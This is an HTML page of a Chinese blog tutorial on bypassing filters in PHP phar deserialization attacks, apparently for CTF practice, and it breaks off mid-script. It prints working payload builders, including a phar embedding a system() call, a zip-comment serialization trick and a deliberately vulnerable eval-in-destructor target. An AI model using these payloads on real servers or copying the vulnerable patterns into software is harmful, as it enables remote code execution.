@@ -1,0 +1,392 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇\n0x02 question 文件头 修改stub，在其中加入图片头即可\n1 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); 协议 1 2 1、使用filter伪协议来进行绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php class Hello{ public $name=&#39;bao&#39;; } @unlink("phar.phar"); $phar=new Phar("phar.phar"); $phar->startBuffering(); //开缓冲 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); $o=new Hello(); $phar->setMetadata($o); $phar->addFromString("m.php","<?php system(&#39;dir&#39;); ?>"); //写入m.php $phar->stopBuffering(); //关缓冲 ?> 1 2 <?php include(&#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&#39;); 2、使用bzip2协议来进行绕过\n这里还是正常生成一个phar文件，只不过要进行处理一下\n1 2 3 bzip2 -k phar.phar compress.bzip2://phar://phar.phar/m.php 3、使用zlib协议进行绕过\n'><title>phar反序列化bypass</title><link rel=canonical href=https://baozongwi.xyz/p/phar-deserialization-bypass/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="phar反序列化bypass"><meta property='og:description' content='0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇\n0x02 question 文件头 修改stub，在其中加入图片头即可\n1 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); 协议 1 2 1、使用filter伪协议来进行绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php class Hello{ public $name=&#39;bao&#39;; } @unlink("phar.phar"); $phar=new Phar("phar.phar"); $phar->startBuffering(); //开缓冲 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); $o=new Hello(); $phar->setMetadata($o); $phar->addFromString("m.php","<?php system(&#39;dir&#39;); ?>"); //写入m.php $phar->stopBuffering(); //关缓冲 ?> 1 2 <?php include(&#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&#39;); 2、使用bzip2协议来进行绕过\n这里还是正常生成一个phar文件，只不过要进行处理一下\n1 2 3 bzip2 -k phar.phar compress.bzip2://phar://phar.phar/m.php 3、使用zlib协议进行绕过\n'><meta property='og:url' content='https://baozongwi.xyz/p/phar-deserialization-bypass/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='phar'><meta property='article:tag' content='姿势'><meta property='article:published_time' content='2024-10-12T21:28:14+00:00'><meta property='article:modified_time' content='2024-10-12T21:28:14+00:00'><meta name=twitter:title content="phar反序列化bypass"><meta name=twitter:description content='0x01 前言 前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇\n0x02 question 文件头 修改stub，在其中加入图片头即可\n1 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); 协议 1 2 1、使用filter伪协议来进行绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php 1 2 3 4 5 6 7 8 9 10 11 12 13 <?php class Hello{ public $name=&#39;bao&#39;; } @unlink("phar.phar"); $phar=new Phar("phar.phar"); $phar->startBuffering(); //开缓冲 $phar->setStub("GIF89a<?php __HALT_COMPILER();?>"); $o=new Hello(); $phar->setMetadata($o); $phar->addFromString("m.php","<?php system(&#39;dir&#39;); ?>"); //写入m.php $phar->stopBuffering(); //关缓冲 ?> 1 2 <?php include(&#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&#39;); 2、使用bzip2协议来进行绕过\n这里还是正常生成一个phar文件，只不过要进行处理一下\n1 2 3 bzip2 -k phar.phar compress.bzip2://phar://phar.phar/m.php 3、使用zlib协议进行绕过\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#文件头>文件头</a></li><li><a href=#协议>协议</a></li><li><a href=#绕过-__halt_compiler>绕过 <code>__HALT_COMPILER</code></a></li><li><a href=#签名计算>签名计算</a><ol><li><a href=#修复>修复</a></li><li><a href=#tar绕过>tar绕过</a></li></ol></li><li><a href=#gc机制>GC机制</a></li><li><a href=#脏数据>脏数据</a><ol><li><a href=#已知头部可控>已知头部(可控)</a></li><li><a href=#已知头部不可控>已知头部(不可控)</a></li><li><a href=#绕过尾部脏数据不可控>绕过尾部脏数据(不可控)</a></li><li><a href=#头尾一起>头尾一起</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/phar-deserialization-bypass/>phar反序列化bypass</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-10-12T21:28:14Z>Oct 12, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 487 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>前面学习phar反序列化的时候我就看到有一些绕过姿势，但是感觉太多了，于是想着单写一篇</p><h1 id=0x02-question>0x02 question</h1><h2 id=文件头>文件头</h2><p>修改<code>stub</code>，在其中加入图片头即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$phar-&gt;setStub(&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;);
+</span></span></code></pre></td></tr></table></div></div><h2 id=协议>协议</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1、使用filter伪协议来进行绕过
+</span></span><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bao&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>     <span class=c1>//开缓冲
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>=</span><span class=k>new</span> <span class=nx>Hello</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;m.php&#34;</span><span class=p>,</span><span class=s2>&#34;&lt;?php system(&#39;dir&#39;); ?&gt;&#34;</span><span class=p>);</span>  <span class=c1>//写入m.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>      <span class=c1>//关缓冲
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;php://filter/read=convert.base64-encode/resource=phar://phar.phar/m.php&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>2、使用bzip2协议来进行绕过</p><p>这里还是正常生成一个<code>phar</code>文件，只不过要进行处理一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bzip2 -k phar.phar 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>compress.bzip2://phar://phar.phar/m.php
+</span></span></code></pre></td></tr></table></div></div><p>3、使用zlib协议进行绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gzip -k phar.phar
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>compress.zlib://phar://phar.phar/m.php
+</span></span></code></pre></td></tr></table></div></div><p>4、使用tar</p><p>tar 处理时, PHP 会检测压缩包中是否存在 <code>.phar/.metadata</code>, 存在的话就会将 .metadata 里的内容<strong>直接进行反序列化</strong></p><p>但是这种情况要把序列化的数据写在<code>.phar/.metadata</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mkdir .phar
+</span></span><span class=line><span class=cl>cd .phar
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>echo &#39;O:1:&#34;A&#34;:2:{s:4:&#34;text&#34;;s:7:&#34;success&#34;;}&#39; &gt; .metadata
+</span></span><span class=line><span class=cl>cd ../
+</span></span><span class=line><span class=cl>tar -cf phar.tar .phar/
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$text</span> <span class=o>=</span> <span class=s1>&#39;test&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>text</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>text</span> <span class=o>=</span> <span class=s1>&#39;fail&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>5、利用别的协议打头</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>compress.bzip://phar:///test.phar/test.txt
+</span></span><span class=line><span class=cl>compress.bzip2://phar:///test.phar/test.txt
+</span></span><span class=line><span class=cl>compress.zlib://phar:///home/sx/test.phar/test.txt
+</span></span><span class=line><span class=cl>php://filter/resource=phar:///test.phar/test.txt
+</span></span></code></pre></td></tr></table></div></div><h2 id=绕过-__halt_compiler>绕过 <code>__HALT_COMPILER</code></h2><p>1、直接<code>gzip</code>，然后协议包含即可</p><p>2、创建zip文件包含来进行反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bao&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.zip&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>Hello</span><span class=p>());</span>
+</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>=</span><span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$res</span><span class=o>=</span><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s1>&#39;phar.zip&#39;</span><span class=p>,</span><span class=nx>ZipArchive</span><span class=o>::</span><span class=na>CREATE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s1>&#39;test.txt&#39;</span><span class=p>,</span><span class=s1>&#39;file content goes here&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>setArchiveComment</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$zip</span><span class=o>-&gt;</span><span class=na>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span> 
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span> 
+</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>code</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>        <span class=p>}</span> 
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span> 
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>php会包含zip文件中注释的内容，所以这里成功包含</p><p><img src=/p/phar-deserialization-bypass/QQ20241012-131442.png width=900 height=774 loading=lazy alt=1></p><h2 id=签名计算>签名计算</h2><h3 id=修复>修复</h3><p>这里我们打开<code>phar</code>文件就可以知道</p><p>签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1</p><p><img src=/p/phar-deserialization-bypass/QQ20241012-132905.png width=768 height=417 loading=lazy alt=1></p><p>SHA-1 哈希的长度是20字节，所以往前看20个字节位就是签名</p><p><img src=/p/phar-deserialization-bypass/QQ20241012-133128.png width=773 height=385 loading=lazy alt=1></p><p>然后<strong>需要计算签名的数据</strong>就是把整个文件内容剪掉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>签名+签名类型+GBMB标志
+</span></span></code></pre></td></tr></table></div></div><p>最后我们重新计算签名就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;demo.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> 
